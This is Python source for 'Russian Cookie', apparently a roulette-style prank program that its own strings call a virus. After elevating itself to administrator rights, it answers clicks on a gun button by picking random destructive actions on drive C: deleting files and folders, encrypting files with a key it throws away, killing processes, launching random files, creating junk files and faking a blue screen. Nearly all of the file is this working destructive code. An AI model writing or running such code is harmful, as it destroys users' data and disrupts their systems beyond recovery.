import os
from ctypes import windll
from string import printable
from glob import glob
from simpleaudio import WaveObject
from json import load, dump
from random import choice, randint, random
from psutil import process_iter
from signal import SIGBREAK
from webbrowser import open_new
from shutil import rmtree
from sys import executable, argv
from pyautogui import hotkey
from cryptography.fernet import Fernet
from tkinter import *
    

if windll.shell32.IsUserAnAdmin():
    
    def rndFile(folder=False, file=False):
        
        percent_to_continue = 0
        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
        path = "C:"
        
        while True:
            
            try: path = choice(glob(f"{path}/*"))
            except:
                percent_to_continue = 0
                # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                path = "C:"
                continue
            
            if os.path.isdir(path):
                
                if len(path) == 0:
                    percent_to_continue = 0
                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
                
                if random.random() < percent_to_continue: 
                    try: 
                        path = path.replace("\\", "/")
                        if folder: return path
                        else: 0 / 0
                    except:
                        percent_to_continue = 0
                        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                        path = "C:"
                        continue
                
                percent_to_continue += 0.1
                
            else:
                try: 
                    path = path.replace("\\", "/")
                    if file: return path
                    else: 0 / 0
                except:
                    percent_to_continue = 0
                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
        
    def delAll(path):
        
        while True:
        
            try:
            
                if not "Russian" in path:
                
                    if os.path.isdir(path):
                        rmtree(path)
                        path = path.replace('/', '\\')
                        return f"Folder deleted : {path}"
                    else: 
                        os.remove(path)
                        path = path.replace('/', '\\')
                        return f"File deleted : {path}"
                    
                else: return "The virus prevented self-deletion."
                
            except: path = rndFile(folder=True, file=True)
                    
    def cptFile(path):
        
        while True:
        
            try:
                
                if not "Russian" in path:
            
                    fernet = Fernet(Fernet.generate_key())
                    with open(path, 'rb') as f: original = f.read()
                    with open(path, 'wb') as encrypted_file: encrypted_file.write(fernet.encrypt(original))
                    
                    path = path.replace('/', '\\')
                    return f"File crypted : {path}"
                
                else: return "Virus prevented from self-encrypting."    
                
            except: path = rndFile(file=True)
    
    def kilProcess():
        
        while True:
            
            try:       
                process_dict = {}
    
                for p in process_iter(): process_dict[p.pid] = p.name()
                
                k = choice(list(process_dict.keys()))
                
                if process_dict[k] not in ["svchost.exe", "gui.exe"]:
                    os.kill(k, SIGBREAK)  
                    return f"Process stopped : {process_dict[k]}"
                    
            except: continue
          
    def strFile(path):
        
        while True:
        
            try: 
                os.startfile(path)
                
                path = path.replace('/', '\\')
                return f"File started : {path}"
            
            except: path = rndFile(file=True)
            
    def addFile(path):
        
        while True:
        
            try:
            
                name = ""
                for i in range(randint(1, 10)): name += choice(printable)
                    
                ext = ""
                for i in range(2, 5): ext += choice(printable)
                    
                with open(f"{path}/{name}.{ext}", "w+") as f: f.write(f"{str(name) * 100}\n")
                
                path = path.replace('/', '\\')
                return f"File {name}.{ext} created at {path}"
                
            except: path = rndFile(folder=True)
                
    def Bsod():
        os.system("taskkill /f /im explorer.exe")
        hotkey("win", "d")
        os.startfile("BSoD.exe")
        window.destroy()
        
    def Center(win):
        win.update_idletasks()
        width = win.winfo_width()
        frm_width = win.winfo_rootx() - win.winfo_x()
        win_width = width + 2 * frm_width
        height = win.winfo_height()
        titlebar_height = win.winfo_rooty() - win.winfo_y()
        win_height = height + titlebar_height + frm_width
        x = win.winfo_screenwidth() // 2 - win_width // 2
        y = win.winfo_screenheight() // 2 - win_height // 2
        win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
        win.deiconify()

    def CommingSoon():
        global text_action, color
        text_action = "Comming Soon !"
        color = "#0E5395"

    def SettingsSaveWrite(k):
        
        global settings, save_settings
        
        settings["save_settings"][k] = save_settings[k].get()
            
        with open("scripts/settings.json", "w") as j: dump(settings, j, indent=4)
           
    def ClosePopup():
        
        global settings
        
        settings["first_start"] = False
        
        with open("scripts/settings.json", "w") as f: dump(settings, f, indent=4)
        
        link.destroy()
        LoadApp()
            
    def LoadApp():
        
        global menu
        
        main_canvas.delete("all")
        main_canvas.create_window(mcw/2, 375, window=gun_button)
        menu.destroy()
        menu = Menu(window, tearoff=0)
        window.config(menu=menu)
        menu.add_command(label="Settings", command=LoadSettings)
        menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))

    def LoadSettings():
        
        main_canvas.delete("all")
        main_canvas.create_rectangle(mcw/2-mcw/2.25, mch/2-mch/2.5, mcw/2+mcw/2.25, mch/2+mch/2.5, fill="#273746", width=round(ww*wh/108000), outline='#1C2833')
        main_canvas.create_window(mcw/1.0945273631840796019900497512438, mch/6.8571428571428571428571428571429, window=quit_button)
        main_canvas.create_window(mcw/2, 125, window=settings_title)
        main_canvas.create_window(mcw/10.891089108910891089108910891089, mch/2.88, window=sound_c)
        main_canvas.create_window(mcw/10.47619047619047619047619047619, mch/2.4, window=deleting_c)
        main_canvas.create_window(mcw/10, mch/2.0571428571428571428571428571429, window=encrypting_c)
        main_canvas.create_window(mcw/10.78431372549019607843137254902, mch/1.8, window=starting_c)
        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.6, window=creating_c)
        main_canvas.create_window(mcw/11, mch/1.44, window=taskkill_c)
        main_canvas.create_window(mcw/11.578947368421052631578947368421, mch/1.3090909090909090909090909090909, window=bsod_c)
        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.2, window=nothing_c)

    def onClick():
        
        global text_action, gun_button, color
        
        while True:
        
            rda = round(random.random(), 2)
            
            if not 0.01 < rda <= 0.2 and save_settings["Sounds"].get():
                gun_button.configure(image=gunshot)
                shot_audio.play()
                window.after(100, lambda: gun_button.configure(image=gun))
            
            if 0 <= rda <= 0.01 and save_settings["Bsod"].get(): Bsod()
            elif 0.01 < rda <= 0.2 and save_settings["Nothing"].get():
                text_action = "You haven't had anything ... So far!"
                color = "#cfcfb8"
                break
            elif 0.2 < rda <= 0.4 and save_settings["Deleting"].get():
                text_action = delAll(rndFile(folder=True, file=True))
                color = "#E20808"
                break
            elif 0.4 < rda <= 0.5 and save_settings["Encrypting"].get():
                text_action = cptFile(rndFile(file=True))
                color = "#E208B4"
                break
            elif 0.5 < rda <= 0.7 and save_settings["Starting"].get():
                text_action = strFile(rndFile(file=True))
                color = "#42BF20"
                break
            elif 0.7 < rda <= 0.8 and save_settings["Creating"].get():
                text_action = addFile(rndFile(folder=True))
                color = "#0843E2"
                break
            elif 0.8 < rda <= 1 and save_settings["Taskkill"].get():
                text_action = kilProcess()
                color = "#DA5914"
                break
            else:
                c = True
                for v in save_settings.values():
                    if v.get():
                        c = False
                if c:
                    text_action = "You must activate at least one event in the settings !"
                    color = "#E20808"
                    break
           

    window = Tk()
    window.title("Russian Cookie")
    window.iconbitmap("assets/logo.ico")
    ww = round(window.winfo_screenwidth() / 1.28)
    wh = round(window.winfo_screenheight() / 1.5)
    window.configure(background='black')
    window.geometry(f"{ww}x{wh}")
    window.maxsize(ww, wh)
    window.minsize(ww, wh)
    
    with open("scripts/settings.json", "r") as j: 
        settings = load(j)
    save_settings = dict(settings["save_settings"])
    first_start = bool(settings["first_start"])
    
    for k, b in save_settings.items(): 
        ex = BooleanVar()
        ex.set(b)
        save_settings[k] = ex

    mcw = round(ww / 1.3636363636363636363636363636364)
    mch = round(wh / 1)
    lcw = round(ww / 3.75)
    list_canvas = Canvas(window, width=lcw, height=mch, highlightthickness=0, bg='#292926')
    main_canvas = Canvas(window, width=mcw, height=mch, highlightthickness=0, bg='#4e4e47')
    
    menu = Menu(window, tearoff=0)
    window.config(menu=menu)
    menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
    
    shot_audio = WaveObject.from_wave_file("assets/shot.wav")
    gun = PhotoImage(file="assets/gun.png")
    gunshot = PhotoImage(file="assets/gunshot.png")
    gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0, cursor="hand2")

    link = Label(window, text="Github", fg="blue", bg="#697783", cursor="hand2", font=("Cascadia Code SemiLight", round(ww*wh/72000)))
    title = Label(window, text="Hey you ! Thank you for downloading this app !", fg="#283747", font=("Carlito", round(ww*wh/36000), "underline"), bg="#697783")
    sl = Label(window, font=("Cascadia Code SemiLight", round(ww*wh/72000)), bg="#697783", fg="#D8D3E3", text="For more info or help you can take a look on the       .\nDon't hesitate to share the app with your friends and suggest changes !")
    ok_button = Button(window, cursor="hand2", relief=FLAT, bg="#24B7C1", border=0, height=round(mch/144), width=round(mcw/36.666666666666666666666666666667), fg="#262828", text="I'm ok !", font=("Cascadia Mono", round(ww*wh/108000)), activeforeground="#BCC9CA", activebackground="#1ACCD8", command=ClosePopup)

    quit_png = PhotoImage(file="assets/quit.png")
    quit_button = Button(window, cursor="hand2", image=quit_png, relief=FLAT, borderwidth=0, command=LoadApp, activebackground="#273746", background="#273746")
    settings_title = Label(window, text="Settings", fg="#5D6D7E", font=("Carlito", round(ww*wh/21600), "underline"), bg="#273746")
    sound_c = Checkbutton(window, cursor="hand2", text="Sound", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Sounds"], command=lambda: SettingsSaveWrite("Sounds"))
    deleting_c = Checkbutton(window, cursor="hand2", text="Deleting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Deleting"], command=lambda: SettingsSaveWrite("Deleting"))
    encrypting_c = Checkbutton(window, cursor="hand2", text="Encrypting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Encrypting"], command=lambda: SettingsSaveWrite("Encrypting"))
    starting_c = Checkbutton(window, cursor="hand2", text="Starting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Starting"], command=lambda: SettingsSaveWrite("Starting"))
    creating_c = Checkbutton(window, cursor="hand2", text="Creating", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Creating"], command=lambda: SettingsSaveWrite("Creating"))
    taskkill_c = Checkbutton(window, cursor="hand2", text="Taskkill", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Taskkill"], command=lambda: SettingsSaveWrite("Taskkill"))
    bsod_c = Checkbutton(window, cursor="hand2", text="Bsod", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Bsod"], command=lambda: SettingsSaveWrite("Bsod"))
    nothing_c = Checkbutton(window, cursor="hand2", text="Nothing", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Nothing"], command=lambda: SettingsSaveWrite("Nothing"))


    h = 0
    le = round((ww * wh) / 72000)
    ps = round((ww * wh) / 108000)
    linejmp = round((ww * wh) / 20000)
    texts = []
    text_action = None
    color = "black"

    main_canvas.place(x=0, y=0)
    list_canvas.place(x=mcw, y=0)
    
    if not first_start:
        LoadApp()
        
    else:
        main_canvas.create_rectangle(mcw/2-mcw/2.5, mch/2-mch/2.75, mcw/2+mcw/2.5, mch/2+mch/2.75, fill="#697783", width=round(ww*wh/108000), outline='#202225')
        main_canvas.create_window(mcw/2, mch/2-210, window=title)
        main_canvas.create_window(mcw/2, mch/2-125, window=sl)
        main_canvas.create_window(mcw/2, mch/2+175, window=ok_button)
        link.place(x=mcw/1.3836477987421383647798742138365, y=mch/3.4951456310679611650485436893204)
        link.bind("<Button-1>", lambda e: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
        link.lift()
           
    while True:
        
        try:
        
            if text_action is not None:
                h += le
                if h >= mch:
                    list_canvas.delete("all")
                    h = le
                if len(text_action) > linejmp: 
                    list_canvas.create_text(0, h, text=f">  {text_action[:linejmp]}", font=('Consolas', ps), fill=color, anchor="w")
                    h += le
                    list_canvas.create_text(0, h, text=f"   {text_action[linejmp:]}", font=('Consolas', ps), fill=color, anchor="w")
                else: list_canvas.create_text(0, h, text=f">  {text_action}", font=('Consolas', ps), fill=color, anchor="w")
                text_action = None
            window.update()
            
        except: break

else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)
